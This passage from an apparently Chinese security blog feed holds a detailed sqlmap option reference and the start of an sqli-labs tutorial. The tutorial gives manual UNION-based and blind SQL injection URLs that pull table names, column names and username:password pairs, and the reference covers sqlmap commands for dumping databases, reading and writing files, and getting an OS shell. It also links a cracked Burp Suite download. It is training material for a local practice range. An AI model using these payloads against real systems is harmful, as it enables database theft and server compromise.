title="设置cookie参数"></a>设置cookie参数</h3><p><strong>使用场景</strong></p><p>web应用程序有基于cookie验证的过程</p><p>利用cookie值上的sql注入漏洞</p><p><strong>过程</strong></p><p>登录/浏览页面（无法登录是无法获取正确cookie值的）</p><p>审计工具/代理工具截断，复制cookie</p><p>在使用sqlmap</p><blockquote><p>注：对HTTP cookie值进行sql注入探测，需要设置 –level 2以上</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> sqlmap -r target.txt --level 2 -p uname</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure></blockquote><p><code>--cookie</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://192.168.127.137/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit" --cookie "security=impossible; PHPSESSID=jeadfeijr3rc9sv6fcaib8" --banner</span><br></pre></td></tr></table></figure><blockquote><p>如果服务器端响应新的cookie值，此时sqlmap 会询问你将要使用哪组cookie</p></blockquote><p><code>--drop-set-cookie</code> </p><p>忽略任何即将到来的set-cookie头,仍然使用我们自己设置的cookie值，丢弃服务端响应的cookie值</p><p><code>--load-cookies</code> </p><p>可以用来加载一些 Netscape/wget格式的特殊文件的cookie</p><p><code>--cookie-del</code> 进行分割的参数</p><h3 id="设置user-agent头"><a href="#设置user-agent头" class="headerlink" title="设置user-agent头"></a>设置user-agent头</h3><blockquote><p>默认情况下，sqlmap使用用户代理头，执行HTTP请求：sqlmap/1.0-dev-xxxxxx(<a href="http://sqlmap.org" target="_blank" rel="noopener">http://sqlmap.org</a>)</p><p>一些站点在服务端检测HTTP user-agent值，如果不是一个合法的值，就会中断连接，同时sqlmap也会报出错误</p></blockquote><p><code>--user-agent</code> 用来伪造（自定义）用户代理</p><p><code>--random-agent</code> 会在<code>./txt/user-agent</code>中随机选择一个用于会话中的所有Http请求(usr/share/sqlmap/txt/user-agents.txt)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "..." --random-agent --banner</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "..." --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --banner</span><br></pre></td></tr></table></figure><blockquote><p>注： 对user-agent值（*）探测sql注入，需要设置–level 3</p></blockquote><h3 id="设置host头"><a href="#设置host头" class="headerlink" title="设置host头"></a>设置host头</h3><p>可以手动设置HTTP主机头值，默认情况下，从目标url解析http主机头</p><blockquote><p>注： 对HTTP主机头进行host注入检测，设置level 5</p><p>如果在http头内的host,标了“*”，则可不设置level 5</p></blockquote><h3 id="设置referer头"><a href="#设置referer头" class="headerlink" title="设置referer头"></a>设置referer头</h3><p>伪造http referer 值是可能的，默认情况下，如果没有显式设置，http请求中不会发送http引用头</p><blockquote><p>对于http引用头sql注入测试，应甚至level 3</p></blockquote><h3 id="设置额外的http头"><a href="#设置额外的http头" class="headerlink" title="设置额外的http头"></a>设置额外的http头</h3><p><code>--header</code></p><p><code>--headers</code></p><p>提供额外的 http 标头，每个标头必须要用换行符分隔，在sqlmap.conf 配置文件中设置更方便</p><p>“\n”作为–headers的分隔符</p><h3 id="设置http协议认证"><a href="#设置http协议认证" class="headerlink" title="设置http协议认证"></a>设置http协议认证</h3><p><code>--auth-type</code></p><p>支持Basic,Digest,NTLM</p><p><code>--auth-cred</code></p><p>认证语法为： username：password</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmapd -u "http://url/arit.php?id=1" --auth-type Basic --auth-cred "testuser:testpass"</span><br></pre></td></tr></table></figure><h3 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h3><p><code>--proxy</code>  设置http代理服务器位置,格式：http(s)://ip[:port]</p><p><code>--proxy-cred</code>  设置http代理服务器认证信息，格式：–proxy-cred username:password</p><p><code>--proxy-file</code> 设置多条代理在文本中，可进行替换，快速完成切换</p><p><code>--ignore-proxy</code> 忽略系统设置的代理服务器</p><h3 id="设置tor隐藏网络"><a href="#设置tor隐藏网络" class="headerlink" title="设置tor隐藏网络"></a>设置tor隐藏网络</h3><p>–tor</p><p>–tor-port </p><p>–tor-type </p><p>–check-tor 检查tor是否可用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install tor #如果没有，需要安装</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service tor start</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "..." -tor --tor-type https --check-tor</span><br></pre></td></tr></table></figure><h3 id="设置延迟"><a href="#设置延迟" class="headerlink" title="设置延迟"></a>设置延迟</h3><p>某些服务器，会在你发包过快发出预警，或中断；默认是不设置延迟的。</p><p>–delay 0.5 设置延迟0.5秒</p><h3 id="设置超时"><a href="#设置超时" class="headerlink" title="设置超时"></a>设置超时</h3><p>指定等待的秒数，默认是30秒</p><p>–timeout 10.5  10秒半</p><h3 id="设置重试次数"><a href="#设置重试次数" class="headerlink" title="设置重试次数"></a>设置重试次数</h3><p>默认重试3次</p><p>–retries 4</p><h3 id="设置随机化参数"><a href="#设置随机化参数" class="headerlink" title="设置随机化参数"></a>设置随机化参数</h3><p>随即更改参数名称所对应的值，（sqlmap默认随机）</p><p>–randomize 参数名称（特定）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "...?id=1" --randomize id --banner</span><br></pre></td></tr></table></figure><h3 id="设置日志过滤目标"><a href="#设置日志过滤目标" class="headerlink" title="设置日志过滤目标"></a>设置日志过滤目标</h3><p>日志解析，并指定有效的Python正则表达式，用于过滤所需的日志</p><p>–scope</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -l burp.log --scope="(www)?\.target\.(com|net|org)"</span><br></pre></td></tr></table></figure><p>–skip-urlencode 不进行URL加密，有时中文或符号在服务端不遵循这种加密。</p><h3 id="设置忽略401"><a href="#设置忽略401" class="headerlink" title="设置忽略401"></a>设置忽略401</h3><p>–ignore-401  用来忽略未验证错误</p><p>当你想测试偶尔返回401（未授权的）站点，，你想忽略他并在不提供验证的情况下继续测试</p><h3 id="设置http协议私钥"><a href="#设置http协议私钥" class="headerlink" title="设置http协议私钥"></a>设置http协议私钥</h3><p>当web服务器需要适当地客户端证书和用于身份验证的私钥时，提供的值为pem格式的key-file，其中包含证书和私钥。</p><p>–auth-file 文件名</p><h3 id="设置安全模式"><a href="#设置安全模式" class="headerlink" title="设置安全模式"></a>设置安全模式</h3><p>避免多次请求失败后销毁会话</p><p>可能发生在sqlmap的检测阶段会利用任何盲sql注入类型时，原因是sql有效负载不一定返回输出，因此可能会向应用程序会话管理或检查技术发出信号。</p><p>–safe-url</p><p>–safe-post</p><p>–safe-req</p><p>–safe-freq</p><h3 id="设置忽略URL编码"><a href="#设置忽略URL编码" class="headerlink" title="设置忽略URL编码"></a>设置忽略URL编码</h3><p>–skip-urlencode</p><p>根据参数的位置（例如get）,默认情况下他的值可以是URL编码的。在某些情况下，后端web服务器不遵循RFC标准，需要以原始的非编码形式发送值。</p><h2 id="性能优化设置"><a href="#性能优化设置" class="headerlink" title="性能优化设置"></a>性能优化设置</h2><p><code>-o</code> 可以开启所有性能优化参数</p><h3 id="设置持久http连接"><a href="#设置持久http连接" class="headerlink" title="设置持久http连接"></a>设置持久http连接</h3><p>在HTTP报文中设置Connection：Keep-Alive。可避免服务器资源，性能受到影响</p><p>–keep-alive </p><h3 id="设置不接受http-body"><a href="#设置不接受http-body" class="headerlink" title="设置不接受http body"></a>设置不接受http body</h3><p>sqlmap中检索没有body响应的内容</p><p>–unll-connection</p><h3 id="设置多线程"><a href="#设置多线程" class="headerlink" title="设置多线程"></a>设置多线程</h3><p>默认 1，为不影响服务器的性能和资源，sqlmap最大为 10 </p><p>–threads</p><h3 id="设置预测输出"><a href="#设置预测输出" class="headerlink" title="设置预测输出"></a>设置预测输出</h3><p>与–thread不兼容，在算法中用于检索值字符的顺序统计预测</p><p>–predict-output</p><h2 id="指定位置注入"><a href="#指定位置注入" class="headerlink" title="指定位置注入"></a>指定位置注入</h2><h3 id="注入介绍"><a href="#注入介绍" class="headerlink" title="注入介绍"></a>注入介绍</h3><h3 id="设置指定注入参数"><a href="#设置指定注入参数" class="headerlink" title="设置指定注入参数"></a>设置指定注入参数</h3><p><code>-p</code>指定具体的探测参数（例 -p “id,uesr-agent”）</p><p>–skip:忽略探测具体参数，例如 –level –skip “user-agent,referer”</p><blockquote><p>–level 1-5,5时忽略所有参数</p></blockquote><p>–param-exclude：忽略包含具体内容的参数。例如：–param-exclude=”token|session” 不对包含token或session的参数进行探测</p><p>–skip-static：忽略非动态参数</p><h3 id="设置任意注入位置"><a href="#设置任意注入位置" class="headerlink" title="设置任意注入位置"></a>设置任意注入位置</h3><p>例：参数：值*</p><h2 id="注入参数"><a href="#注入参数" class="headerlink" title="注入参数"></a>注入参数</h2><h3 id="强制设置DBMS"><a href="#强制设置DBMS" class="headerlink" title="强制设置DBMS"></a>强制设置DBMS</h3><p>默认会自动探测目标web应用程序的后端数据库管理系统</p><p>sqlmap完全支持的dbms种类：MySQL，oracle,Microsoft sql server,ibm db2,sqlite,firebird,sybase,sap maxdb,hsqldb,informix</p><p>–dbms 数据库管理系统名称 [版本号]</p><p>例如：–dbms mysql [5.0]    –dbms microsoft sql sever 05</p><h3 id="强制设置OS指定"><a href="#强制设置OS指定" class="headerlink" title="强制设置OS指定"></a>强制设置OS指定</h3><p>默认自动识别探测目标web应用程序的后端操作系统（OS）</p><p>sqlmap全支持的OS种类：Linux，Windows</p><p>–os windows 或 –os linux</p><h3 id="关闭负载转换机制"><a href="#关闭负载转换机制" class="headerlink" title="关闭负载转换机制"></a>关闭负载转换机制</h3><p>–no-cast：防止NULL与字符串连接（dbms版本老旧），将null转换为空格</p><h3 id="关闭字符转义机制"><a href="#关闭字符转义机制" class="headerlink" title="关闭字符转义机制"></a>关闭字符转义机制</h3><p>–no-escape</p><blockquote><p>字符转义机制:’f’    CHAR(102),混淆有效负载内容，防止后端服务器上查询转义机制（例如magic_quotes和/或 mysql_real_escape_string）</p></blockquote><h3 id="强制设置无效值替换"><a href="#强制设置无效值替换" class="headerlink" title="强制设置无效值替换"></a>强制设置无效值替换</h3><p>要使原始参数值无效（例如id=12）时，经典的否定（例如id=-12）</p><p> –invalid-bignum ：强制使用大整数（例如id=99999999）</p><p>–invalid-logical ：强制使用布尔操作来实现相同的目标（例如id=12 and 18=19）</p><p>–invalid-string ：强制使用随机字符串（例如id=adsfa）</p><h3 id="自定义注入负载位置"><a href="#自定义注入负载位置" class="headerlink" title="自定义注入负载位置"></a>自定义注入负载位置</h3><p>–prefix ：sql注入payload前缀</p><p>–suffix  ：sql注入payload后缀</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://target.php?id=1" -p id --prefix "')" --suffix "and ('abc'=abc" --dbs -v 5</span><br></pre></td></tr></table></figure><h3 id="设置tamper脚本"><a href="#设置tamper脚本" class="headerlink" title="设置tamper脚本"></a>设置tamper脚本</h3><p>–tamper</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "..." --tamper "between.py,randomcase.py" -v 3</span><br></pre></td></tr></table></figure><blockquote><p>-v 3,5  查看http请求中的payload</p><p>存储脚本位置(usr/share/sqlmap/tamper)</p></blockquote><h3 id="设置dbms认证"><a href="#设置dbms认证" class="headerlink" title="设置dbms认证"></a>设置dbms认证</h3><p>–dbms-cred=”root:toor”</p><h2 id="自定义检测参数"><a href="#自定义检测参数" class="headerlink" title="自定义检测参数"></a>自定义检测参数</h2><h3 id="设置探测等级"><a href="#设置探测等级" class="headerlink" title="设置探测等级"></a>设置探测等级</h3><p>–level 1-5，默认1，探测复杂程度逐步提升</p><p>在xml/payload.xml 中指定了有效负载</p><h3 id="设置风险参数"><a href="#设置风险参数" class="headerlink" title="设置风险参数"></a>设置风险参数</h3><p>–risk 1-3 ，默认1基本无害，2增加了基于时间的sql注入，3又增加了or的sql 注入</p><p>例如update，or 可能会打乱表单</p><h3 id="设置页面比较参数"><a href="#设置页面比较参数" class="headerlink" title="设置页面比较参数"></a>设置页面比较参数</h3><p>–string 指定包含字符穿，查询为true</p><p>–not-string  指定包含字符串，查询为false</p><p>–regexp 指定通过正则表达式匹配字符串，查询为true</p><p>–code 指定匹配http状态响应码，查询为true</p><h3 id="设置内容比较参数"><a href="#设置内容比较参数" class="headerlink" title="设置内容比较参数"></a>设置内容比较参数</h3><p>–text-only 设置页面内容包含文本(–text-only=”welcome!”)</p><p>–titles 设置title中包含文本，前提是知道如何区分查询的真假（–titles=”Login”）</p><h2 id="注入技术参数"><a href="#注入技术参数" class="headerlink" title="注入技术参数"></a>注入技术参数</h2><h3 id="设置具体sql注入技术"><a href="#设置具体sql注入技术" class="headerlink" title="设置具体sql注入技术"></a>设置具体sql注入技术</h3><p>默认 使用所有技术</p><p>–technique</p><p>B:Boolean-based blind 基于布尔的盲注</p><p>E：Error-based 报错注入</p><p>U：Union query-based Union查询注入</p><p>S：Stacked queries 堆叠注入</p><p>T：Time-based blind 基于时间的盲注</p><p>Q：lnline queries 内联查询注入</p><h3 id="设置时间盲注延迟时间"><a href="#设置时间盲注延迟时间" class="headerlink" title="设置时间盲注延迟时间"></a>设置时间盲注延迟时间</h3><p>–time-sec 整数，默认为5秒</p><h3 id="设置union字段数"><a href="#设置union字段数" class="headerlink" title="设置union字段数"></a>设置union字段数</h3><p>默认情况下 使用1-10列的union查询的sql注入技术，但是提高level值，可增加至50列</p><p>–union-cols 12-16</p><h3 id="设置union字符"><a href="#设置union字符" class="headerlink" title="设置union字符"></a>设置union字符</h3><p>–union-char 123 替换unll,可能会使探测成功</p><h3 id="设置union查询表"><a href="#设置union查询表" class="headerlink" title="设置union查询表"></a>设置union查询表</h3><p>–union-from 表名(其他表有限制)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "" --technique U --union-from users --current-db -v3</span><br></pre></td></tr></table></figure><h3 id="设置DNS露出攻击"><a href="#设置DNS露出攻击" class="headerlink" title="设置DNS露出攻击"></a>设置DNS露出攻击</h3><p>针对目标网络可能对外流量进行限制，或者设置WAF。通过dns协议绕过限制，获取数据</p><p>–dns-domain “dns 服务器”（需要用户具有一个开放53端口的dns服务器），通过dns流量来获取数据</p><h3 id="设置二次注入"><a href="#设置二次注入" class="headerlink" title="设置二次注入"></a>设置二次注入</h3><p>–second-order url(url为二次注入的响应页面）</p><h3 id="识别指纹"><a href="#识别指纹" class="headerlink" title="识别指纹"></a>识别指纹</h3><p>–fingerprint -f</p><h2 id="检索DBMS信息"><a href="#检索DBMS信息" class="headerlink" title="检索DBMS信息"></a>检索DBMS信息</h2><h3 id="检索dbms-banner"><a href="#检索dbms-banner" class="headerlink" title="检索dbms banner"></a>检索dbms banner</h3><p>–banner -b 获取后端数据库banner信息</p><h3 id="检索dbms当前用户"><a href="#检索dbms当前用户" class="headerlink" title="检索dbms当前用户"></a>检索dbms当前用户</h3><p>–current-user</p><h3 id="检索dbms当前数据库"><a href="#检索dbms当前数据库" class="headerlink" title="检索dbms当前数据库"></a>检索dbms当前数据库</h3><p>–current-db 获取当前数据库名</p><h3 id="检索当前主机名"><a href="#检索当前主机名" class="headerlink" title="检索当前主机名"></a>检索当前主机名</h3><p>–hostname</p><h3 id="探测当前用户DBA"><a href="#探测当前用户DBA" class="headerlink" title="探测当前用户DBA"></a>探测当前用户DBA</h3><p>–is-dba 探测当前用户是否是数据库管理员</p><h3 id="枚举DBMS用户"><a href="#枚举DBMS用户" class="headerlink" title="枚举DBMS用户"></a>枚举DBMS用户</h3><p>–users 获取dbms所有用户</p><h3 id="枚举dbms用户密码"><a href="#枚举dbms用户密码" class="headerlink" title="枚举dbms用户密码"></a>枚举dbms用户密码</h3><p>–password 获取用户密码</p><h3 id="枚举dbms权限"><a href="#枚举dbms权限" class="headerlink" title="枚举dbms权限"></a>枚举dbms权限</h3><p>–privileges</p><p>–role(角色)</p><h2 id="枚举信息"><a href="#枚举信息" class="headerlink" title="枚举信息"></a>枚举信息</h2><h3 id="列举数据库名"><a href="#列举数据库名" class="headerlink" title="列举数据库名"></a>列举数据库名</h3><p>-dbs</p><h3 id="枚举数据库表"><a href="#枚举数据库表" class="headerlink" title="枚举数据库表"></a>枚举数据库表</h3><p>–tables 枚举表名 -》指定具体数据库 -D 数据库名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-D security --tables</span><br></pre></td></tr></table></figure><p>–exclude-sysdbs 获取除了系统数据库的表名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--tables --exclude-sysdbs</span><br></pre></td></tr></table></figure><h3 id="枚举数据表列"><a href="#枚举数据表列" class="headerlink" title="枚举数据表列"></a>枚举数据表列</h3><p>–columns -D指定数据库 -T指定数据表 </p><h3 id="枚举数据值"><a href="#枚举数据值" class="headerlink" title="枚举数据值"></a>枚举数据值</h3><p>–dump    -D -T -C制定具体字段</p><h3 id="枚举schema信息"><a href="#枚举schema信息" class="headerlink" title="枚举schema信息"></a>枚举schema信息</h3><p>–schema</p><p>–schema –ex clude-sysdbsg    只会检索和显示非系统数据库的模式的一部分</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "..." --schema --threads 10 --batch</span><br></pre></td></tr></table></figure><h3 id="检索数据表数量"><a href="#检索数据表数量" class="headerlink" title="检索数据表数量"></a>检索数据表数量</h3><p>–count -D</p><h3 id="获取数据信息"><a href="#获取数据信息" class="headerlink" title="获取数据信息"></a>获取数据信息</h3><p>–start –stop</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--start 1 --stop 3</span><br></pre></td></tr></table></figure><p>不包括第一页，<del>1</del>23</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--stop 1</span><br></pre></td></tr></table></figure><p>获取第一张表</p><p>–first –last</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--first 2 --last 5</span><br></pre></td></tr></table></figure><p>从第二个出发到第五个字符</p><h3 id="设置条件获取信息"><a href="#设置条件获取信息" class="headerlink" title="设置条件获取信息"></a>设置条件获取信息</h3><p>–pivot-column=id 设置独一无二的列，主键</p><p>–where=”id&gt;3” 设置条件</p><h3 id="暴力破解数据"><a href="#暴力破解数据" class="headerlink" title="暴力破解数据"></a>暴力破解数据</h3><p>使用场景：MySQL&lt;5.0时，MySQL中没有元数据库information_schema</p><p>–common-tables 破解数据库名</p><p>–common-columus 破解表名</p><h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>须有读取权限</p><p>–file-read 路径（绝对路径）     读取对应文件内容</p><h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><p>须有写入权限</p><p>–file-write 写入本地文件(绝对路径)</p><p>–file-dest 将读取的文件写入到远程绝对路径（结对路径）</p><h3 id="检索所有信息"><a href="#检索所有信息" class="headerlink" title="检索所有信息"></a>检索所有信息</h3><p>-a -all</p><h2 id="系统参数"><a href="#系统参数" class="headerlink" title="系统参数"></a>系统参数</h2><h3 id="执行系统参数"><a href="#执行系统参数" class="headerlink" title="执行系统参数"></a>执行系统参数</h3><p>–os-shell</p><p>（1）网站必须是root权限</p><p>（2）攻击者需要知道网站的绝对路径</p><p>（3）GPC为off，php主动转义的功能关闭</p><h2 id="通用参数"><a href="#通用参数" class="headerlink" title="通用参数"></a>通用参数</h2><h3 id="加载sqlite会话文件"><a href="#加载sqlite会话文件" class="headerlink" title="加载sqlite会话文件"></a>加载sqlite会话文件</h3><p>-s </p><h3 id="加载http文本文件"><a href="#加载http文本文件" class="headerlink" title="加载http文本文件"></a>加载http文本文件</h3><p>-t 将流量加载到文本文件当中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "..." -t /root/Desktop/target.txt --flush-session -v3 --batch</span><br></pre></td></tr></table></figure><h3 id="设置默认选择选项"><a href="#设置默认选择选项" class="headerlink" title="设置默认选择选项"></a>设置默认选择选项</h3><p>–batch</p><h3 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h3><p>–os-cmd=”命令”</p><h3 id="设置盲注字符集"><a href="#设置盲注字符集" class="headerlink" title="设置盲注字符集"></a>设置盲注字符集</h3><p>在基于时间，布尔盲注中，用户自定义字符集来加速数据检索过程</p><p>–charset=”123456789asdw”</p><h3 id="爬取url"><a href="#爬取url" class="headerlink" title="爬取url"></a>爬取url</h3><p>爬取三层url</p><p>三层</p><h3 id="在CSV输出中使用分割字符"><a href="#在CSV输出中使用分割字符" class="headerlink" title="在CSV输出中使用分割字符"></a>在CSV输出中使用分割字符</h3><p>–csv-del=”;”</p><h3 id="设置输出格式"><a href="#设置输出格式" class="headerlink" title="设置输出格式"></a>设置输出格式</h3><p>在将转储表数据存储到输出目录中的相应文件中时，sqlmap支持三种不同的格式：CSV，HTML和SQLITE。默认的是CSV</p><p>–dump-format=””</p><h3 id="探测之前检测Internet连接"><a href="#探测之前检测Internet连接" class="headerlink" title="探测之前检测Internet连接"></a>探测之前检测Internet连接</h3><p>检测当前计算机Internet连接是否正常（是否能连接sqlmap指定服务器上）</p><p>–check-internet</p><h3 id="解析和测试表单"><a href="#解析和测试表单" class="headerlink" title="解析和测试表单"></a>解析和测试表单</h3><p>–form</p><h3 id="估计时间"><a href="#估计时间" class="headerlink" title="估计时间"></a>估计时间</h3><p>–eta</p><h3 id="刷新会话文件"><a href="#刷新会话文件" class="headerlink" title="刷新会话文件"></a>刷新会话文件</h3><p>避免默认缓存机制</p><p>–flush-session</p><h3 id="忽略会话中存储的结果"><a href="#忽略会话中存储的结果" class="headerlink" title="忽略会话中存储的结果"></a>忽略会话中存储的结果</h3><p>保持会话文件不变</p><p>–fresh-queries</p><p>使用Hex函数检索数据</p><p>确保数据不会丢失，返回正确结果</p><p>–hex</p><h3 id="自定义输出路径"><a href="#自定义输出路径" class="headerlink" title="自定义输出路径"></a>自定义输出路径</h3><p>–output-dir=””</p><h3 id="响应页面解析错误"><a href="#响应页面解析错误" class="headerlink" title="响应页面解析错误"></a>响应页面解析错误</h3><p>–parse-errors 返回错误信息</p><p>–save=“路径” 保存为配置文件（-c）</p><p>–update 更新</p><h3 id="设置DBMS编码"><a href="#设置DBMS编码" class="headerlink" title="设置DBMS编码"></a>设置DBMS编码</h3><p>–encoding=”gbk”</p><h3 id="存储http流量到HAR"><a href="#存储http流量到HAR" class="headerlink" title="存储http流量到HAR"></a>存储http流量到HAR</h3><p>HAR(http archive) 是一个用来储存http请求/响应信息的通用文件格式，基于JSON</p><p>–har=”HARFILE”</p><h3 id="筛选具体payload"><a href="#筛选具体payload" class="headerlink" title="筛选具体payload"></a>筛选具体payload</h3><p>–test-filter=“ROW”</p><h3 id="过滤具体payload"><a href="#过滤具体payload" class="headerlink" title="过滤具体payload"></a>过滤具体payload</h3><p>–test-skip=”BENCHMARK” </p><p>–scope=”regex”  针对proxy日志文件使用正则表达式筛选目标</p><blockquote><p>参考链接</p><p><a href="https://www.freebuf.com/sectool/164608.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/164608.html</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/2019/06/02/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/06/02/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>搭建sql注入靶场：<br>工具：phpstudy , sqli , sqlmap , 浏览器</p><a id="more"></a><h2 id="sql注入："><a href="#sql注入：" class="headerlink" title="sql注入："></a>sql注入：</h2><p>sql语言是解释型语言，就是源代码解释（需要解释器）成机器码直接执行</p><p>sql注入原理：利用站点设计漏洞，在web表单的输入域或页面请求的字符串，注入不同意图的sql语句，来获得信息。（注入原理：用户输入，用户可控，修改并带入sql语句，然后执行）</p><p>目的： 获取关键信息，例如账号密码，数据库表内存储数据。</p><p>方式：手工，工具</p><p>burpsuite工具链接：<a href="https://pan.baidu.com/s/1pCEyXH5mkD2RojXk7DvXdA" target="_blank" rel="noopener">https://pan.baidu.com/s/1pCEyXH5mkD2RojXk7DvXdA</a><br>提取码：1mbb<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p><p><a href="https://www.cnblogs.com/tynam/p/10089111.html" target="_blank" rel="noopener">破解参考博客</a></p><p><a href="https://www.cnblogs.com/nieliangcai/p/6689915.html" target="_blank" rel="noopener">burpsuite使用参考博客</a></p><h3 id="get基于报错的注入"><a href="#get基于报错的注入" class="headerlink" title="get基于报错的注入"></a>get基于报错的注入</h3><p><strong>Less-1:</strong><br>‘’1’’ LIMIT 0,1’<br>‘1’’ LIMIT 0,1<br>sql: select password,a from admain where id=’’ LIMIT 0,1</p><p><code>手工注入：</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sqli/Less-1/?id=1' order by 3  --+ ✔判断字段数</span><br><span class="line">联合查询：</span><br><span class="line">127.0.0.1/sqli/Less-1/?id=0' UNION SELECT 1,user(),database() --+✔</span><br><span class="line"></span><br><span class="line">127.0.0.1/sqli/Less-1/?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ #✔获取表名</span><br><span class="line"></span><br><span class="line">127.0.0.1/sqli/Less-1/?id=0' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+ #✔获取字段名</span><br><span class="line"></span><br><span class="line">127.0.0.1/sqli/Less-1/?id=0' union select 1,group_concat(username,0x3a,password),3 from users--+ #✔获取字段值</span><br></pre></td></tr></table></figure><blockquote><p>解读： 0x3a为 ”:“</p></blockquote><p><code>sqlmap:</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --dbs --batch</span><br><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security --tables --batch</span><br><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security -T users --columns --batch</span><br><span class="line"><span class="meta">#</span><span class="bash">下面(<span class="string">''</span>是错的，要用<span class="string">""</span>或无引号，如下)</span></span><br><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security -T users -C "password,username" --dump --batch</span><br><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security -T users -C password,username --dump --batch</span><br></pre></td></tr></table></figure><p><strong>Less-2:</strong><br>‘’ LIMIT 0,1’<br>‘ LIMIT 0,1<br>sql: select * from admain where id=1 limit 0,1</p><p><strong>Less-3：</strong><br>‘’1&#39;) LIMIT 0,1’<br>‘1&#39;) LIMIT 0,1<br>sql: select * from admain where id = (‘1’) limit 0,1</p><p><strong>Less-4:</strong><br>‘“1&quot;) LIMIT 0,1’<br>“1&quot;) LIMIT 0,1<br>sql: select * from  admain where id=(“1”) limit 0,1</p><h3 id="get盲注："><a href="#get盲注：" class="headerlink" title="get盲注："></a>get盲注：</h3><h4 id="基于时间的盲注："><a href="#基于时间的盲注：" class="headerlink" title="基于时间的盲注："></a>基于时间的盲注：</h4><p><strong>Less-9:</strong></p><p>127.0.0.1/sqli/Less-9/?id=1” and if(ascii(stustr(database(),1,1))=115,1,sleep(3)) –+</p><p><strong>Less-10:</strong></p><p>127.0.0.1/sqli/Less-10/?id=1” and if(ascii(stustr(database(),1,1))=115,1,sleep(3)) –+</p><h4 id="基于boolean的盲注："><a href="#基于boolean的盲注：" class="headerlink" title="基于boolean的盲注："></a>基于boolean的盲注：</h4><p><strong>less-8</strong>:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sqli/Less-8/?id=1' and length(database())=8 --+</span><br><span class="line"><span class="meta">#</span><span class="bash">可接在 and 后</span></span><br><span class="line">stustr(database(),1,1)</span><br><span 